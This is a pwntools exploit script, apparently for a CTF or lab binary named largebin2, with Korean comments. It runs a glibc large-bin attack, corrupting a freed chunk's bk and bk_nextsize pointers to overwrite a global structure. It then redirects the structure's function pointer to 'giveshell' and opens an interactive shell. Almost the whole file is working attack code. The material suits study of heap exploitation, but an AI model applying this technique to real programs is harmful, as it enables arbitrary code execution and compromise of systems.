# largebin2.py
from pwn import *
context.log_level = 'debug' 
p = process("./largebin2")
elf = ELF('./largebin2')
def add(size):
	print p.sendlineafter(">","1")
	print p.sendlineafter(":",str(size))
def free(idx):
	print p.sendlineafter(">","2")
	print p.sendlineafter(":",str(idx))
def edit(idx,data):
	print p.sendlineafter(">","3")
	print p.sendlineafter(":",str(idx))
	print p.sendafter("Data",str(data))

add(0x320) # 0 => smallbin(unsortedbin)
add(0x100) # 1 => no merge
add(0x400) # 2 => largebin
add(0x100) # 3 => no merge
add(0x410) # 4 => largebin(unsortedbin)
add(0x100) # 5 => no merge

free(0) # unsortedbin -> 0
free(2) # unsortedbin -> 0 -> 2
add(0x100) # unsortedbin -> 0, largebin -> 2
free(4) # unsortedbin -> 0 -> 4, largebin -> 2

payload = p64(0) + p64(elf.symbols['c']-(2*8))
payload += p64(0) + p64(elf.symbols['c']-(4*8)) + '\n'

edit(2, payload) # largebin fd = 0, bk = c-(2*8), fd_nextsize = 0, bk_nextsize = c-(4*8)
add(0x100) # 7
# (struct malloc_chunk)(c-(4*8))->bk_nextsize = 4번 청크(unsorted bin)
# (struct malloc_chunk)(c-(2*8))->bk = 4번 청크(unsorted bin)

payload2 = 'A'*(0x20-0x10) # name(0x20) -  sizeof(prev_size, size)0x10
payload2 += p64(0) # count
payload2 += p64(elf.symbols['giveshell']) # func
edit(4, payload2+'\n')

# memcpy(c->name, p64(prev_size) + p64(size) + 'A'*0x10, 0x20)
# c->count = 0, c->func = giveshell

p.sendlineafter(">","4")
# giveshell(...)
p.interactive()